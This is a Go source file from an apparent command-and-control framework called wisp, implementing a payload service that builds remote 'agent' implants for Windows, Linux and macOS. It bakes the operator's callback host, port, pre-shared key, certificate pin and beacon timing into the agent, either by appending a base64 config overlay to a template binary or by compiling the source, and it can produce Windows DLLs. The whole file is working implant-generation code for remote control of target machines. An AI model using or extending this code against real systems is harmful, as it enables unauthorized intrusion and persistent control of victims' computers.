package services

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	"github.com/user/wisp/internal/db"
	"github.com/user/wisp/shared/protocol"
)

// exeDir returns the directory of the running wisp.exe.
func exeDir() string {
	execPath, err := os.Executable()
	if err != nil {
		return "."
	}
	return filepath.Dir(execPath)
}

// PayloadService handles agent payload generation.
type PayloadService struct {
	serverSvc *ServerService
}

// NewPayloadService creates a new PayloadService.
func NewPayloadService(serverSvc *ServerService) *PayloadService {
	return &PayloadService{serverSvc: serverSvc}
}

// PayloadConfig is the configuration for generating a payload.
type PayloadConfig struct {
	ListenerID string `json:"listener_id"`
	TargetOS   string `json:"target_os"`   // windows, darwin, linux
	TargetArch string `json:"target_arch"` // amd64, arm64
	Type       string `json:"type"`        // "exe" (default) or "dll" (stage module)
	// Method selects the generation engine:
	//   "template" (default) - overlay config onto a pre-built agent; no Go
	//                          toolchain or sources required on this machine.
	//   "source"             - compile from <wisp.exe dir>/agent-src (needs Go).
	Method     string `json:"method"`
	Sleep      int    `json:"sleep"`       // milliseconds
	Jitter     int    `json:"jitter"`      // percentage 0-100
	OutputPath string `json:"output_path"` // where to save the binary
}

// AgentConfig is the JSON injected into the agent.
type AgentConfig struct {
	ServerHost        string `json:"server_host"`
	ServerPort        int    `json:"server_port"`
	UseTLS            bool   `json:"use_tls"`
	Transport         string `json:"transport"` // "tcp" or "http"
	PSK               string `json:"psk"`       // pre-shared key for registration auth
	ServerFingerprint string `json:"server_fp"` // SHA-256 cert pin (hex)
	Sleep             int    `json:"sleep"`
	Jitter            int    `json:"jitter"`
	KillDate          int64  `json:"kill_date"`
	RSAPublicKey      string `json:"rsa_public_key"`
}

// Generate builds an agent binary with the given configuration.
func (ps *PayloadService) Generate(config PayloadConfig) (string, error) {
	if config.ListenerID == "" {
		return "", fmt.Errorf("listener id is required")
	}
	listener, err := ps.serverSvc.GetDB().GetListener(config.ListenerID)
	if err != nil {
		return "", fmt.Errorf("get listener: %w", err)
	}

	// Keep the generated config inside the safe range: a sleep below the
	// minimum or a >100% jitter would busy-loop the agent against the server.
	if config.Sleep < protocol.MinSleepMS {
		return "", fmt.Errorf("invalid sleep: %d ms (minimum %d ms)", config.Sleep, protocol.MinSleepMS)
	}
	if config.Jitter < 0 || config.Jitter > protocol.MaxJitterPct {
		return "", fmt.Errorf("invalid jitter: %d%% (must be 0-%d)", config.Jitter, protocol.MaxJitterPct)
	}

	method := config.Method
	if method == "" {
		method = "template"
	}

	if method == "source" {
		return ps.generateFromSource(config, listener)
	}
	return ps.generateFromTemplate(config, listener)
}

// makeAgentConfig builds the JSON config from the listener and payload settings.
// The callback address (listener.Host) is what gets baked into the payload,
// never the bind address: a listener on 0.0.0.0 must not make agents dial
// 0.0.0.0 or 127.0.0.1 on the target machine.
func (ps *PayloadService) makeAgentConfig(config PayloadConfig, listener *db.ListenerRow) AgentConfig {
	host := listener.Host
	if host == "" || host == "0.0.0.0" || host == "::" {
		host = listener.BindHost
	}
	if host == "" || host == "0.0.0.0" || host == "::" {
		// Legacy rows without a callback host: fall back to this machine's IP.
		host = pickServerHost()
	}
	return AgentConfig{
		ServerHost:        host,
		ServerPort:        listener.BindPort,
		UseTLS:            listener.UseTLS,
		Transport:         listener.Protocol,
		PSK:               listener.PSK,
		ServerFingerprint: ps.serverSvc.GetServer().TLSFingerprint(),
		Sleep:             config.Sleep,
		Jitter:            config.Jitter,
		KillDate:          0,
		RSAPublicKey:      ps.serverSvc.GetRSAPublicKey(),
	}
}

// templateDirOverride lets tests point template payload generation at a
// temporary directory instead of <wisp.exe dir>/templates.
var templateDirOverride string

// templatesDir returns the directory holding the pre-built agent templates.
// Templates are NOT embedded into wisp.exe; they live in a "templates" folder
// next to the executable (created by `build.bat templates`) so the server
// binary stays small and templates can be updated without a rebuild.
func (ps *PayloadService) templatesDir() string {
	if templateDirOverride != "" {
		return templateDirOverride
	}
	return filepath.Join(exeDir(), "templates")
}

// generateFromTemplate appends the config overlay onto a pre-built agent
// template. Fast, no Go toolchain needed; the templates must be present in a
// "templates" directory next to wisp.exe.
func (ps *PayloadService) generateFromTemplate(config PayloadConfig, listener *db.ListenerRow) (string, error) {
	if config.TargetOS != "windows" && config.TargetOS != "linux" && config.TargetOS != "darwin" {
		return "", fmt.Errorf("unsupported target os: %s", config.TargetOS)
	}
	if config.TargetArch != "amd64" && config.TargetArch != "arm64" {
		return "", fmt.Errorf("unsupported target arch: %s", config.TargetArch)
	}

	name := fmt.Sprintf("agent_%s_%s", config.TargetOS, config.TargetArch)
	switch {
	case config.Type == "dll":
		if config.TargetOS != "windows" {
			return "", fmt.Errorf("dll payloads are only supported on windows")
		}
		name += ".dll"
	case config.TargetOS == "windows":
		name += ".exe"
	}
	tmplPath := filepath.Join(ps.templatesDir(), name)
	tmpl, err := os.ReadFile(tmplPath)
	if err != nil {
		hint := ""
		if config.Type == "dll" {
			hint = " (DLL templates need gcc: run `build.bat templates` on the build machine; alternatively switch to source compilation)"
		}
		return "", fmt.Errorf(
			"template %s not found at %s: template payload generation needs the pre-built agent templates next to wisp.exe (run `build.bat templates` on the build machine, then copy the templates folder next to wisp.exe)%s (%v)",
			name, tmplPath, hint, err,
		)
	}

	cfgJSON, err := json.Marshal(ps.makeAgentConfig(config, listener))
	if err != nil {
		return "", fmt.Errorf("marshal config: %w", err)
	}
	cfgB64 := base64.StdEncoding.EncodeToString(cfgJSON)

	out := make([]byte, 0, len(tmpl)+len(protocol.OverlayMarker)+len(cfgB64))
	out = append(out, tmpl...)
	out = append(out, protocol.OverlayMarker...)
	out = append(out, cfgB64...)

	outputPath := ps.resolveOutputPath(config)
	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
		return "", err
	}
	if err := os.WriteFile(outputPath, out, 0755); err != nil {
		return "", fmt.Errorf("write payload: %w", err)
	}
	return outputPath, nil
}

// generateFromSource compiles the agent from the agent-src directory next to
// wisp.exe. Requires the Go toolchain (and gcc for DLL builds).
func (ps *PayloadService) generateFromSource(config PayloadConfig, listener *db.ListenerRow) (string, error) {
	agentDir := filepath.Join(exeDir(), "agent-src")
	if _, err := os.Stat(agentDir); os.IsNotExist(err) {
		extra := ""
		if config.Type == "dll" {
			extra = " and a C compiler (gcc) for DLL builds"
		}
		return "", fmt.Errorf(
			"agent source not found at %s: source payload generation needs the agent source in the agent-src directory next to wisp.exe, plus the Go toolchain (`go`) in PATH%s",
			agentDir, extra,
		)
	}

	// Determine build mode
	buildMode := ""
	switch config.Type {
	case "dll":
		if config.TargetOS != "windows" {
			return "", fmt.Errorf("dll payloads are only supported on windows")
		}
		buildMode = "c-shared"
	}

	outputPath := ps.resolveOutputPath(config)
	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
		return "", err
	}

	cfgJSON, err := json.Marshal(ps.makeAgentConfig(config, listener))
	if err != nil {
		return "", fmt.Errorf("marshal config: %w", err)
	}
	cfgBase64 := base64.StdEncoding.EncodeToString(cfgJSON)

	// No shell is involved, so the ldflags value must NOT be quoted.
	ldflags := fmt.Sprintf("-s -w -X github.com/user/wisp/agent/config.ConfigData=%s", cfgBase64)

	args := []string{"build"}
	if buildMode != "" {
		args = append(args, "-buildmode", buildMode)
	}
	args = append(args, "-ldflags", ldflags, "-trimpath", "-o", outputPath, ".")

	cmd := exec.Command("go", args...)
	cmd.Dir = agentDir
	cgo := "0"
	if buildMode == "c-shared" {
		cgo = "1"
	}
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("GOOS=%s", config.TargetOS),
		fmt.Sprintf("GOARCH=%s", config.TargetArch),
		"CGO_ENABLED="+cgo,
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %s\n%s", err, string(output))
	}
	return outputPath, nil
}

// resolveOutputPath returns the payload destination, defaulting to a payloads
// folder next to wisp.exe.
func (ps *PayloadService) resolveOutputPath(config PayloadConfig) string {
	if config.OutputPath != "" {
		return config.OutputPath
	}
	ext := ""
	if config.TargetOS == "windows" {
		ext = ".exe"
	}
	if config.Type == "dll" {
		ext = ".dll"
	}
	return filepath.Join(exeDir(), "payloads", fmt.Sprintf("agent_%s_%s%s", config.TargetOS, config.TargetArch, ext))
}

// GetSupportedTargets returns available OS/Arch combinations.
func (ps *PayloadService) GetSupportedTargets() []map[string]string {
	return []map[string]string{
		{"os": "windows", "arch": "amd64", "label": "Windows x64"},
		{"os": "windows", "arch": "arm64", "label": "Windows ARM64"},
		{"os": "linux", "arch": "amd64", "label": "Linux x64"},
		{"os": "linux", "arch": "arm64", "label": "Linux ARM64"},
		{"os": "darwin", "arch": "amd64", "label": "macOS x64"},
		{"os": "darwin", "arch": "arm64", "label": "macOS ARM64"},
	}
}

// GetCurrentPlatform returns the current platform info.
func (ps *PayloadService) GetCurrentPlatform() map[string]string {
	return map[string]string{
		"os":   runtime.GOOS,
		"arch": runtime.GOARCH,
	}
}
